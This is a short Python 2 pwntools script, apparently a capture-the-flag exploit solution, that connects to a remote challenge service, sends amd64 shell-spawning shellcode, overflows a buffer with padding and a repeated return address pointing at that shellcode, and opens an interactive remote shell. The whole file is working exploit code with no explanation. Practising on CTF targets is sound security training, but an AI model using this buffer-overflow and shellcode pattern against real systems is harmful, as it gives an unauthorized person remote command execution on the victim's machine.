#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'

r = remote('pwnhub.tw', 54321)
#r = remote('127.0.0.1', 7122)

buff_addr = 0x601080
print len(asm(shellcraft.sh()))
#embed()
r.send(asm(shellcraft.sh()))
r.sendline('A'*32 + p64(buff_addr)*4)
r.interactive()

